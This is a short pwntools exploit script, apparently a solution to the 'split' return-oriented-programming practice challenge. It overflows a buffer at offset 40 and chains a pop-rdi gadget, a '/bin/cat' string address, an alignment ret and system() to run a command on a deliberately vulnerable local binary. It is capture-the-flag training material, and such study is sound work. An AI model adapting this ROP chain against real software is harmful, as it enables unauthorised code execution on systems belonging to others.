from pwn import *

bin = './split'
elf = context.binary =  ELF(bin, checksec=False)
context.log_level = 'debug'

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

if args.GDB:  # Set GDBscript above
    io = gdb.debug(bin, gdbscript=gdbscript)
else:  # Run locally
    io = process()


# Found with GDB
offset = 40
bin_cat_str = 0x601060
pop_rdi = 0x4007c3
ret = 0x40053e
system = 0x400560

payload = flat(
    "a"*offset,
    pop_rdi,
    bin_cat_str,
    ret, # for that alignment
    system
)
# this payload is nice because it shows exactly how the stack will look like after we our input
pprint(payload)

io.sendlineafter(b'>', payload)

io.interactive()
